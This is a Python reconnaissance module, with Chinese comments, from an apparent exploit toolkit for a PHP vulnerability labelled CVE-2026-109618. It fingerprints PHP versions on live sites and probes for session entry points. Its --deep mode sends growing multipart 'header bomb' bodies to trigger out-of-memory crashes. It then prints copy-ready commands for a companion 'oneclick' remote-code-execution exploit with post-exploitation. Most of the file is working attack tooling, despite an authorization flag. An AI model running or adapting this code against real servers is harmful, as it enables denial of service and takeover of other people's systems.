#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""recon —— CVE-2026-109618 真实站点侦察（默认只读，深度落点探测需显式 --deep）

为什么需要它
------------
真实生产站点通常剥离 X-Powered-By、隐藏 phpinfo、把 404 改成自定义页，
仅靠 `fingerprint`（响应体 PHP/x.y.z + X-Powered-By）会一律落到 rc=10
「LIKELY_RCE 但无证据」。本模块用多条**只读**通道取证，并把
「能不能打」拆成四个可分别验证的前置：

  1) 版本/影响区间    —— 多通道版本取证（header/body/credits/404 签名/cookie）
  2) 消费点           —— 是否有入口调用 session_start()（PHPSESSID 下发）
  3) 落点             —— post_max_size 与 memory_limit 的相对关系（--deep 实测）
  4) 偏移             —— 版本/build 是否有可用的 profile，否则需 calibrate

输出一个 verdict 分级 + 可直接复制的 next-step 命令。

安全定位
--------
- 默认不发送任何超大 body；`--deep` 才会做递增体积的 OOM 落点探测（有节流与预算上限，
  对生产站点仍可能造成 worker 重启/短暂 5xx，属于**需要授权**的主动测试）。
- 公网目标必须显式 `--i-have-authorization`，否则 exit 3 且零请求。
- 与 oneclick 的分工：recon 只判定可行性，oneclick 才开火。
"""
import argparse
import json
import os
import random
import re
import socket
import ssl
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))

# 受影响区间（官方修复版本）: 8.2<8.2.35 / 8.3<8.3.36 / 8.4<8.4.27 / 8.5<8.5.12
AFFECTED_RANGES = ((8, 2, 35), (8, 3, 36), (8, 4, 27), (8, 5, 12))

# 实测无法完成 RCE 的 build（在区间内但缺 infoleak/偏移不可用）：如实降级，避免假阳性
KNOWN_NO_RCE = {"8.2.12": "8.2.x 无 Stage-1 infoleak 通道，OOM 后拿不到堆基址（实测 6 轮全败，仅 DoS）"}

COMMON_ENTRIES = [
    "/", "/index.php", "/index.html", "/login.php", "/admin/", "/admin.php",
    "/api/", "/home.php", "/main.php", "/app/", "/dashboard/", "/user/",
    "/wp-login.php", "/administrator/", "/phpinfo.php", "/info.php",
]

PHPINFO_PATHS = ["/phpinfo.php", "/info.php", "/php.php", "/test.php", "/i.php"]

# PHP 特殊 ?= 查询串（php_logo / credits / phpinfo 触发器）
MAGIC_QUERIES = {
    "php_logo": "?=PHPE9568F36-D428-11d2-A769-00AA001ACF42",
    "php_credits": "?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
    "phpinfo_css": "?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
}

VER_RE = re.compile(r"PHP[/ ]?(\d+\.\d{1,2}\.\d{1,3})", re.I)
BODY_VER_RE = re.compile(r"PHP Version\s*<?[^0-9]{0,20}(\d+\.\d{1,2}\.\d{1,3})", re.I)
OOM_SIGS = ("Allowed memory size", "memory_limit", "Out of memory",
            "in Unknown on line 0", "exhausted")
RESET_SIGS = ("Connection reset", "Broken pipe", "timed out", "RemoteDisconnected")


def _env_insecure():
    return os.environ.get("PHP2SHELL_INSECURE", "") == "1"


def _ssl_ctx(insecure, host=""):
    if not insecure:
        return ssl.create_default_context()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _hdrs(obj):
    """把重复头合并为 "a, b"（urllib 的 dict 化会丢掉前面的 Set-Cookie）。"""
    acc = {}
    try:
        items = obj.getheaders() if hasattr(obj, "getheaders") else (obj.items() if obj else [])
    except Exception:
        items = []
    for k, v in items:
        k = k.lower()
        acc[k] = (acc[k] + ", " + v) if k in acc else v
    return acc


def is_public_host(host):
    """域名/不可解析按公网保守处理；只有明确内网/环回才放行。"""
    if not host:
        return True
    h = host.strip("[]").split(":")[0]
    try:
        import ipaddress
        ip = ipaddress.ip_address(h)
        return not (ip.is_private or ip.is_loopback or ip.is_link_local)
    except ValueError:
        pass
    if h.lower() in ("localhost", "localhost.localdomain"):
        return False
    try:
        ip = socket.gethostbyname(h)
        import ipaddress
        a = ipaddress.ip_address(ip)
        return not (a.is_private or a.is_loopback or a.is_link_local)
    except Exception:
        return True


class Client(object):
    def __init__(self, base, insecure=False, timeout=12.0, ua=None):
        self.base = base.rstrip("/")
        self.insecure = insecure
        self.timeout = timeout
        self.ua = ua or ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                         "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
        self.sent = 0
        self.bytes = 0

    def url(self, path):
        if path.startswith("http://") or path.startswith("https://"):
            return path
        return self.base + (path if path.startswith("/") else "/" + path)

    def _open(self, req):
        host = urllib.parse.urlsplit(req.full_url).hostname or ""
        ctx = _ssl_ctx(self.insecure, host)
        return urllib.request.urlopen(req, timeout=self.timeout, context=ctx)

    def get(self, path, allow_redirects=False):
        req = urllib.request.Request(self.url(path), method="GET")
        req.add_header("User-Agent", self.ua)
        req.add_header("Accept", "*/*")
        return self._do(req, path)

    def post_raw(self, path, body, ctype, allow_redirects=False):
        req = urllib.request.Request(self.url(path), data=body, method="POST")
        req.add_header("User-Agent", self.ua)
        req.add_header("Content-Type", ctype)
        req.add_header("Content-Length", str(len(body)))
        return self._do(req, path)

    def _do(self, req, path):
        self.sent += 1
        t0 = time.time()
        try:
            r = self._open(req)
            code = r.getcode()
            hdrs = _hdrs(r)
            body = r.read(262144)
            r.close()
            self.bytes += len(body)
            return {"path": path, "code": code, "headers": hdrs,
                    "body": body, "err": None, "ms": int((time.time() - t0) * 1000)}
        except urllib.error.HTTPError as e:
            hdrs = _hdrs(e.headers)
            try:
                body = e.read(262144)
            except Exception:
                body = b""
            self.bytes += len(body)
            return {"path": path, "code": e.code, "headers": hdrs, "body": body,
                    "err": None, "ms": int((time.time() - t0) * 1000)}
        except Exception as e:
            return {"path": path, "code": None, "headers": {}, "body": b"",
                    "err": "%s: %s" % (type(e).__name__, e),
                    "ms": int((time.time() - t0) * 1000)}


# ---------------------------------------------------------------- 版本取证
def _ver_from_text(s):
    if not s:
        return None
    m = BODY_VER_RE.search(s) or VER_RE.search(s)
    return m.group(1) if m else None


def ver_tuple(v):
    try:
        return tuple(int(x) for x in v.split("."))
    except Exception:
        return None


def classify_version(v):
    t = ver_tuple(v)
    if not t or len(t) != 3:
        return "unknown", None
    for major, minor, fixed in AFFECTED_RANGES:
        if t[0] == major and t[1] == minor:
            if t[2] < fixed:
                return "affected", (major, minor, fixed)
            return "patched", (major, minor, fixed)
    if t[0] < 8 or (t[0] == 8 and t[1] < 2):
        return "too_old", None
    return "unknown", None


def probe_version(c, log):
    """返回 (candidates:list of (version, channel, evidence), channels:list of dict)"""
    cands = []
    chans = []

    def add(ver, channel, ev):
        chans.append({"channel": channel, "version": ver, "evidence": ev})
        if ver:
            cands.append((ver, channel, ev))

    # 1) 首页 + index.php 的 headers / body
    for p in ("/", "/index.php"):
        r = c.get(p)
        if r["err"]:
            chans.append({"channel": "http:" + p, "version": None, "evidence": "ERR " + r["err"]})
            continue
        xp = r["headers"].get("x-powered-by", "")
        v = _ver_from_text(xp)
        add(v, "header:x-powered-by@" + p, xp[:120])
        sv = r["headers"].get("server", "")
        v2 = _ver_from_text(sv)
        add(v2, "header:server@" + p, sv[:120])
        v3 = _ver_from_text(r["body"].decode("utf-8", "replace")[:65536])
        add(v3, "body@" + p, "code=%s len=%d" % (r["code"], len(r["body"])))
        # 记号：cookie 名 / 错误页指纹
        sc = r["headers"].get("set-cookie", "")
        if "PHPSESSID" in sc:
            chans.append({"channel": "cookie@" + p, "version": None,
                          "evidence": "Set-Cookie: PHPSESSID（session 消费点存在）"})

    # 2) PHP 特殊查询串：logo/credits 能证明「跑 PHP」，且常带版本
    for name, q in MAGIC_QUERIES.items():
        r = c.get("/" + q)
        if r["err"] or r["code"] is None:
            chans.append({"channel": name, "version": None, "evidence": "ERR %s" % r["err"]})
            continue
        ct = r["headers"].get("content-type", "")
        body = r["body"]
        is_gif = body[:6] in (b"GIF87a", b"GIF89a")
        v = _ver_from_text(body.decode("utf-8", "replace")[:20000])
        ev = "code=%s ct=%s gif=%s len=%d" % (r["code"], ct[:40], is_gif, len(body))
        add(v, name, ev)

    # 3) phpinfo 常见落点
    for p in PHPINFO_PATHS:
        r = c.get(p)
        if r["err"]:
            continue
        if r["code"] == 200 and b"PHP Version" in r["body"]:
            v = _ver_from_text(r["body"].decode("utf-8", "replace")[:80000])
            add(v, "phpinfo@" + p, "200 len=%d" % len(r["body"]))
            break

    # 4) 404 签名：区分 PHP-FPM / mod_php / 非 PHP
    rnd = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    r = c.get("/%s_%d.php" % (rnd, random.randint(1000, 9999)))
    b = r["body"].decode("utf-8", "replace")[:4096]
    sig = []
    if "No input file specified" in b:
        sig.append("php-fpm(No input file specified)")
    if "File not found" in b:
        sig.append("php-fpm(File not found)")
    if r["code"] == 500 and "PHP" in b:
        sig.append("php-500")
    if r["headers"].get("x-powered-by"):
        sig.append("x-powered-by-present")
    chans.append({"channel": "404-signature", "version": _ver_from_text(b),
                  "evidence": "code=%s %s" % (r["code"], ",".join(sig) or "no-php-marker")})

    return cands, chans


def best_version(cands):
    """按通道可信度加权取众数。"""
    weight = {"header:x-powered-by": 5, "body": 3, "phpinfo": 5,
              "php_logo": 2, "php_credits": 2, "header:server": 2}
    score = {}
    for ver, channel, _ev in cands:
        key = channel.split("@")[0]
        score[ver] = score.get(ver, 0) + weight.get(key, 1)
    if not score:
        return None
    return sorted(score.items(), key=lambda kv: -kv[1])[0][0]


# ---------------------------------------------------------------- 消费点
def probe_sinks(c, entries, log):
    sinks = []
    for p in entries:
        r = c.get(p)
        if r["err"]:
            continue
        sc = r["headers"].get("set-cookie", "")
        if "PHPSESSID" in sc:
            sinks.append({"entry": p, "cookie": sc[:160], "code": r["code"]})
            continue
        # 非 PHPSESSID 的会话型 cookie（很多框架自定义 session 名）
        for part in sc.split(","):
            kv = part.strip().split(";")[0]
            if "=" not in kv:
                continue
            name, val = kv.split("=", 1)
            name = name.strip()
            val = val.strip().strip('"')
            if len(val) >= 16 and re.search(r"\d", val) and re.search(r"[A-Za-z]", val) \
                    and name.lower() not in ("security", "lang", "theme", "timezone"):
                sinks.append({"entry": p, "cookie": sc[:160], "code": r["code"],
                              "note": "疑似会话 cookie: " + name})
                break
        time.sleep(0.05)
    return sinks


# ---------------------------------------------------------------- 落点
def build_header_bomb(mb, boundary="----p2srecon"):
    """构造 multipart：单 part 内海量短 header 行（膨胀比最高，实测 ~34x）。"""
    target = int(mb * 1024 * 1024)
    head = ("--%s\r\nContent-Disposition: form-data; name=\"f\"\r\n" % boundary).encode()
    tail = ("\r\n--%s--\r\n" % boundary).encode()
    line = b"X-A: 0123456789abcdef0123456789abcdef\r\n"  # 40B/行
    n = max(1, (target - len(head) - len(tail)) // len(line))
    return head + line * n + tail, "multipart/form-data; boundary=" + boundary


def probe_oom(c, sizes, budget, delay, log):
    """递增 body 体积，识别 OOM/413/连接异常；返回探测记录与判定。"""
    recs = []
    oom_at = None
    pm_hit_at = None
    for mb in sizes:
        if budget and len(recs) >= budget:
            break
        body, ctype = build_header_bomb(mb)
        r = c.post_raw("/", body, ctype)
        txt = ""
        if r["err"]:
            kind = "reset"
            for s in RESET_SIGS:
                if s.lower() in r["err"].lower():
                    kind = "reset:" + s
                    break
            recs.append({"mb": mb, "code": None, "kind": kind, "err": r["err"][:120],
                         "ms": r["ms"]})
            time.sleep(delay)
            continue
        txt = r["body"].decode("utf-8", "replace")[:20000]
        kind = "normal"
        if r["code"] == 413:
            kind = "post_max_exceeded"
            pm_hit_at = mb
        elif any(s in txt for s in OOM_SIGS):
            kind = "oom"
            oom_at = mb
        elif r["code"] and r["code"] >= 500:
            kind = "5xx"
        recs.append({"mb": mb, "code": r["code"], "kind": kind, "ms": r["ms"],
                     "snippet": txt.strip()[:120]})
        time.sleep(delay)
        if oom_at or pm_hit_at:
            break
    verdict = {
        "oom_at_mb": oom_at,
        "post_max_hit_mb": pm_hit_at,
        # OOM 在 body S MB 时发生 ⇒ memory_limit < S 的解析开销；post_max 未在 S 之前拦截
        "post_max_gt_memory_limit": bool(oom_at and not pm_hit_at),
        "records": recs,
    }
    return recs, verdict


# ---------------------------------------------------------------- profile 匹配
def profile_hint(ver):
    db = {}
    try:
        sys.path.insert(0, os.path.dirname(HERE))
        import p2s_ext  # noqa: F401
        db = getattr(p2s_ext, "PROFILE_DB", {}) or {}
    except Exception:
        db = {}
    if not db:
        return {"match": None, "known": [], "advice": "无法载入内建 profile 表"}
    known = sorted(db.keys())
    if ver and ver in db:
        return {"match": ver, "known": known, "advice": "直接可打（同 build）"}
    return {"match": None, "known": known,
            "advice": "版本未在内建表，需 calibrate：`p2s_ext.py calibrate -u URL --collab`"}


def rce_chain_status(args, ver, vclass, sinks, oom, profile):
    """把四个前置合成 verdict。"""
    php_seen = bool(ver) or bool(sinks)
    if vclass == "patched":
        return "NOT_AFFECTED", "版本 %s 已修复（>= 修复线）" % ver
    if vclass == "too_old":
        return "NOT_AFFECTED", "版本 %s 早于受影响区间" % ver
    if vclass == "affected":
        if ver in KNOWN_NO_RCE:
            return "DOS_ONLY", "版本 %s 在区间内但已实测不可 RCE：%s" % (ver, KNOWN_NO_RCE[ver])
        if not sinks:
            return "NO_SESSION_SINK", "版本受影响但未观察到 session 消费点（PHPSESSID 未下发）"
        if args.deep:
            if oom.get("oom_at_mb") and not oom.get("post_max_hit_mb"):
                if profile.get("match"):
                    return "RCE_LIKELY", "四前置齐备：受影响版本 + 消费点 + post_max>memory + 已知 build"
                return "NEEDS_CALIBRATION", "四前置齐备但 build 未知，先 calibrate 偏移"
            if oom.get("post_max_hit_mb") and not oom.get("oom_at_mb"):
                return "DOS_ONLY", "body 在 %sMB 被 413 拦截，post_max_size 小于落点" % oom["post_max_hit_mb"]
            if not oom.get("oom_at_mb"):
                mx = max([r["mb"] for r in oom.get("records", [])] or [0]) if oom.get("records") else 0
                if mx >= 8:
                    return "DOS_ONLY", ("在 %.0fMB 内未触发 OOM：POST 超 post_max_size 会被 PHP 静默截断"
                                        "（不返回 413），落点不可达 → 仅 DoS" % mx)
                return "UNKNOWN_PRECOND", "递增探测未触发 OOM（落点可能高于探测上限，加 --probe-sizes 32,64）"
        return "NEEDS_PRECOND_PROBE", "版本受影响且有消费点；落点未测，加 --deep 判定"
    if php_seen:
        return "UNKNOWN_VERSION", "确认跑 PHP 但版本不可判（-v 加 --deep 或用 phpinfo/错误页人工确认）"
    return "UNKNOWN", "未取得任何 PHP 证据（可能非 PHP 站点或全站 WAF 拦截）"


def next_steps(base, verdict, profile, args):
    cmd = [sys.executable or "python3", os.path.join(HERE, "p2s_ext.py")]
    sec = " --insecure" if args.insecure else ""
    out = []
    if verdict in ("RCE_LIKELY", "NEEDS_CALIBRATION", "NEEDS_PRECOND_PROBE"):
        out.append("%s fingerprint -u %s%s" % (" ".join(cmd), base, sec))
        if verdict == "NEEDS_CALIBRATION":
            out.append("%s calibrate -u %s%s --collab --listen 0.0.0.0:8899" % (" ".join(cmd), base, sec))
        out.append("%s oneclick -u %s%s --http-read %s%s --rounds 8 --tries 2 --force "
                   "--postex --only id --outdir out" % (" ".join(cmd), base, sec, base, sec))
    elif verdict == "DOS_ONLY":
        out.append("仅 DoS：`%s fingerprint -u %s%s` 可留证，不建议继续" % (" ".join(cmd), base, sec))
    elif verdict in ("NOT_AFFECTED", "NO_SESSION_SINK", "UNKNOWN_VERSION", "UNKNOWN"):
        out.append("不建议开火；先人工确认版本/入口（%s fingerprint -u %s%s）" % (" ".join(cmd), base, sec))
    return out


def main(argv=None):
    ap = argparse.ArgumentParser(
        prog="recon",
        description="CVE-2026-109618 真实站点侦察：多通道版本取证 + 消费点 + 落点 + 偏移匹配")
    ap.add_argument("-u", "--url", required=True, help="目标 URL（http/https）")
    ap.add_argument("--insecure", action="store_true", help="跳过 TLS 证书校验（自签靶场）")
    ap.add_argument("--i-have-authorization", dest="authorized", action="store_true",
                    help="公网目标必须显式声明已获授权")
    ap.add_argument("--allow-public", action="store_true", help="同 --i-have-authorization")
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--ua", default=None)
    ap.add_argument("--entries", default="", help="自定义入口列表（逗号分隔），覆盖默认集")
    ap.add_argument("--deep", action="store_true",
                    help="开启落点探测（发送递增体积 multipart，可能造成 5xx，需授权）")
    ap.add_argument("--probe-sizes", default="0.5,1,2,4,8,16")
    ap.add_argument("--budget", type=int, default=6, help="深度探测最多请求数")
    ap.add_argument("--delay", type=float, default=1.0, help="深度探测间隔秒")
    ap.add_argument("--json", action="store_true", help="输出 JSON")
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args(argv)
    a.insecure = a.insecure or _env_insecure()

    base = a.url.rstrip("/")
    host = urllib.parse.urlsplit(base).hostname or ""
    if is_public_host(host) and not (a.authorized or a.allow_public):
        print("[!] 目标是公网地址（%s）：需显式 --i-have-authorization 才会发请求" % host)
        return 3

    c = Client(base, insecure=a.insecure, timeout=a.timeout, ua=a.ua)
    t0 = time.time()
    if not a.json:
        print("[*] recon 目标：%s（insecure=%s deep=%s）" % (base, a.insecure, a.deep))

    cands, chans = probe_version(c, print)
    ver = best_version(cands)
    vclass, fixed = classify_version(ver) if ver else ("unknown", None)

    entries = [x.strip() for x in a.entries.split(",") if x.strip()] or COMMON_ENTRIES
    sinks = probe_sinks(c, entries, print)

    oom_recs, oom = [], {}
    if a.deep:
        sizes = []
        for s in a.probe_sizes.split(","):
            try:
                sizes.append(float(s))
            except ValueError:
                pass
        sizes = sorted(set(sizes))
        oom_recs, oom = probe_oom(c, sizes, a.budget, a.delay, print)

    profile = profile_hint(ver)
    verdict, reason = rce_chain_status(a, ver, vclass, sinks, oom, profile)
    steps = next_steps(base, verdict, profile, a)
    report = {
        "target": base, "insecure": a.insecure, "deep": a.deep,
        "php_version": ver, "version_class": vclass, "fixed_in": fixed,
        "version_channels": chans, "session_sinks": sinks,
        "deep_probes": oom_recs, "precondition": oom, "profile": profile,
        "verdict": verdict, "reason": reason, "next_steps": steps,
        "requests": c.sent, "bytes": c.bytes, "elapsed_ms": int((time.time() - t0) * 1000),
    }
    if a.json:
        print(json.dumps(report, ensure_ascii=False, indent=2))
    else:
        print("\n== 版本取证 ==")
        for ch in chans:
            print("  [%-22s] %-10s %s" % (ch["channel"], ch["version"] or "-", ch["evidence"]))
        fixnote = ("，修复线 %d.%d.%d" % fixed) if fixed else ""
        print("  => 版本 %s（%s%s）" % (ver or "未知", vclass, fixnote))
        print("\n== session 消费点 ==")
        if sinks:
            for s in sinks[:8]:
                print("  [sink] %-16s code=%s %s" % (s["entry"], s["code"], s.get("cookie", "")[:90]))
        else:
            print("  未观察到 PHPSESSID/会话 cookie（%d 个入口）" % len(entries))
        if a.deep:
            print("\n== 落点探测（--deep）==")
            for r in oom_recs:
                print("  %5.2f MB -> code=%s kind=%-18s %s" % (r["mb"], r["code"], r["kind"],
                                                              (r.get("err") or r.get("snippet") or "")[:70]))
            print("  => OOM@%s MB, post_max 拦截@%s MB, post_max>memory_limit=%s"
                  % (oom.get("oom_at_mb"), oom.get("post_max_hit_mb"),
                     oom.get("post_max_gt_memory_limit")))
        print("\n== profile ==")
        print("  match=%s known=%s" % (profile.get("match"), ",".join(profile.get("known") or [])[:120]))
        print("  %s" % profile.get("advice"))
        print("\n== 结论：%s ==" % verdict)
        print("  %s" % reason)
        if steps:
            print("\n== 下一步 ==")
            for s in steps:
                print("  " + s)
        print("\n[统计] 请求 %d 次 / 下载 %d B / 耗时 %d ms"
              % (c.sent, c.bytes, report["elapsed_ms"]))

    if verdict in ("RCE_LIKELY", "NEEDS_CALIBRATION", "NEEDS_PRECOND_PROBE"):
        return 10
    if verdict == "DOS_ONLY":
        return 20
    if verdict == "NOT_AFFECTED":
        return 30
    if verdict == "UNKNOWN":
        return 50
    return 15


if __name__ == "__main__":
    sys.exit(main())
